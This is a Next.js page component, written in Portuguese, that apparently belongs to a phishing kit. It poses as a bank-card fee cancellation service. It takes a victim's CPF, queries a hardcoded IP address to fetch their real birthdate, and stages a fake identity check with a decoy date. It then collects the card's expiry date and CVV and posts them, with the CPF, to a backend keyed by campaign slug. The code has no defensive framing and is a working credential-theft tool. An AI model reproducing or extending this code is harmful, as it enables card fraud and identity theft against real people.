'use client'

import { Navbar } from "@/components/navbar"
import { useState, useEffect } from "react"
import { useParams } from 'next/navigation'
import { toast } from 'sonner'

function LoadingSpinner() {
  return (
    <div className="flex flex-col items-center justify-center py-12">
      <div className="relative">
        <div className="w-20 h-20 border-4 border-transparent border-t-[#0066cc] rounded-full animate-spin"></div>
        <div className="absolute inset-0 flex items-center justify-center">
          <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
          </svg>
        </div>
      </div>
      <p className="mt-4 text-gray-600 text-sm">Processando sua solicitação...</p>
    </div>
  )
}

function generateWrongDate(correctDate: string): string {
  const [day, month, year] = correctDate.split("/")
  const wrongDay = String((Number.parseInt(day) % 28) + 1).padStart(2, "0")
  const wrongMonth = String((Number.parseInt(month) % 12) + 1).padStart(2, "0")
  return `${wrongDay}/${wrongMonth}/${year}`
}

export default function RoutePage() {
  const params = useParams()
  const route = params.route as string

  const [routeConfig, setRouteConfig] = useState<any>(null)
  const [step, setStep] = useState<
    "cpf" | "loading1" | "birthdate" | "loading2" | "expiry" | "loading3" | "cvv" | "loading4" | "success"
  >("cpf")
  const [cpf, setCpf] = useState("")
  const [correctDate, setCorrectDate] = useState("")
  const [wrongDate, setWrongDate] = useState("")
  const [expiry, setExpiry] = useState("")
  const [cvv, setCvv] = useState("")

  useEffect(() => {
    fetchRouteConfig()
  }, [route])

  const fetchRouteConfig = async () => {
    try {
      const response = await fetch(`/api/routes?slug=${route}`)
      const data = await response.json()
      if (!data) {
        toast.error('Route not found')
        return
      }
      setRouteConfig(data)
    } catch (error) {
      toast.error('Failed to load route configuration')
    }
  }

  const formatCpf = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 3) return numbers
    if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`
    if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`
    return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`
  }

  const formatExpiry = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 2) return numbers
    return `${numbers.slice(0, 2)}/${numbers.slice(2, 4)}`
  }

  const handleContinue = async () => {
    if (cpf.replace(/\D/g, "").length !== 11) return

    setStep("loading1")

    try {
      const cpfNumbers = cpf.replace(/\D/g, "")
      const response = await fetch(`http://89.116.24.233:3000/api/cpf/${cpfNumbers}`)
      const data = await response.json()

      if (data.NASC) {
        setCorrectDate(data.NASC)
        setWrongDate(generateWrongDate(data.NASC))
      } else {
        setCorrectDate("21/12/1983")
        setWrongDate("15/06/1983")
      }
    } catch (error) {
      setCorrectDate("21/12/1983")
      setWrongDate("15/06/1983")
    }

    setTimeout(() => {
      setStep("birthdate")
    }, 2000)
  }

  const handleSelectDate = (isCorrect: boolean) => {
    if (isCorrect) {
      setStep("loading2")
      setTimeout(() => {
        setStep("expiry")
      }, 2000)
    }
  }

  const handleExpirySubmit = () => {
    if (expiry.length < 5) return
    setStep("loading3")
    setTimeout(() => {
      setStep("cvv")
    }, 2000)
  }

  const handleCvvSubmit = async () => {
    if (cvv.length < 3) return
    setStep("loading4")

    // Prepare form data
    const formData = {
      cpf,
      birthdate: correctDate,
      expiry,
      cvv,
      route_slug: route,
      timestamp: new Date().toISOString()
    }

    // Send to our API
    try {
      const response = await fetch('/api/requests', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          routeId: routeConfig.id,
          data: formData
        })
      })

      if (!response.ok) {
        throw new Error('Failed to submit form')
      }

      setTimeout(() => {
        setStep("success")
      }, 2000)
    } catch (error) {
      toast.error('Failed to submit form')
      setStep("cvv")
    }
  }

  if (!routeConfig) {
    return <div>Loading...</div>
  }

  return (
    <div className="min-h-screen bg-[#f5f5f5] pt-16">
      <Navbar />

      <main className="flex flex-col items-center px-4 py-6">
        <div className="bg-white w-full max-w-xl shadow-md rounded-lg overflow-hidden">
          <div className="p-5 md:p-8">
            {/* Step 1: CPF */}
            {step === "cpf" && (
              <>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Solicitar Cancelamento
                </h1>
                <p className="text-sm mb-6" style={{ color: "#1976d2" }}>
                  Cancele a taxa mensal do seu cartão de forma segura.
                </p>

                <div className="mb-6">
                  <label className="text-[#0066cc] text-sm font-medium mb-2 block">CPF</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    className="w-full text-[#0066cc] text-lg border-b-2 border-gray-200 py-2 outline-none focus:border-[#0066cc] transition-colors bg-transparent"
                    placeholder="000.000.000-00"
                    value={cpf}
                    onChange={(e) => setCpf(formatCpf(e.target.value))}
                    maxLength={14}
                  />
                </div>

                <button
                  className="w-full bg-[#1a365d] hover:bg-[#2d4a7c] text-white py-3.5 rounded-lg font-medium transition-colors"
                  onClick={handleContinue}
                >
                  Continuar
                </button>
              </>
            )}

            {/* Loading states */}
            {(step === "loading1" || step === "loading2" || step === "loading3" || step === "loading4") && (
              <div className="py-8">
                <LoadingSpinner />
              </div>
            )}

            {/* Step 2: Confirmar identidade com data de nascimento */}
            {step === "birthdate" && (
              <>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Confirme sua Identidade
                </h1>
                <p className="text-sm mb-6" style={{ color: "#1976d2" }}>
                  Selecione sua data de nascimento correta.
                </p>

                <div className="space-y-3">
                  <button
                    className="w-full p-4 border-2 border-gray-200 rounded-lg text-left hover:border-[#0066cc] hover:bg-blue-50 transition-all"
                    onClick={() => handleSelectDate(false)}
                  >
                    <span className="text-lg text-gray-700">{wrongDate}</span>
                  </button>
                  <button
                    className="w-full p-4 border-2 border-gray-200 rounded-lg text-left hover:border-[#0066cc] hover:bg-blue-50 transition-all"
                    onClick={() => handleSelectDate(true)}
                  >
                    <span className="text-lg text-gray-700">{correctDate}</span>
                  </button>
                </div>
              </>
            )}

            {/* Step 3: Data de validade */}
            {step === "expiry" && (
              <>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Data de Validade
                </h1>
                <p className="text-sm mb-6" style={{ color: "#1976d2" }}>
                  Informe a data de validade do seu cartão.
                </p>

                <div className="mb-6">
                  <label className="text-[#0066cc] text-sm font-medium mb-2 block">Validade</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    className="w-full text-[#0066cc] text-lg border-b-2 border-gray-200 py-2 outline-none focus:border-[#0066cc] transition-colors bg-transparent"
                    placeholder="MM/AA"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    maxLength={5}
                  />
                </div>

                <button
                  className="w-full bg-[#1a365d] hover:bg-[#2d4a7c] text-white py-3.5 rounded-lg font-medium transition-colors"
                  onClick={handleExpirySubmit}
                >
                  OK
                </button>
              </>
            )}

            {/* Step 4: CVV */}
            {step === "cvv" && (
              <>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Código de Segurança
                </h1>
                <p className="text-sm mb-6" style={{ color: "#1976d2" }}>
                  Informe o CVV do seu cartão (3 dígitos no verso).
                </p>

                <div className="mb-6">
                  <label className="text-[#0066cc] text-sm font-medium mb-2 block">CVV</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    className="w-full text-[#0066cc] text-lg border-b-2 border-gray-200 py-2 outline-none focus:border-[#0066cc] transition-colors bg-transparent"
                    placeholder="000"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                    maxLength={3}
                  />
                </div>

                <button
                  className="w-full bg-[#1a365d] hover:bg-[#2d4a7c] text-white py-3.5 rounded-lg font-medium transition-colors"
                  onClick={handleCvvSubmit}
                >
                  OK
                </button>
              </>
            )}

            {/* Step 5: Sucesso */}
            {step === "success" && (
              <div className="flex flex-col items-center justify-center py-8">
                <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mb-4">
                  <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <h1 className="text-xl md:text-2xl font-semibold mb-2" style={{ color: "#0d47a1" }}>
                  Solicitação Enviada
                </h1>
                <p className="text-sm text-center" style={{ color: "#1976d2" }}>
                  Sua solicitação de cancelamento foi enviada com sucesso.
                </p>
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  )
}
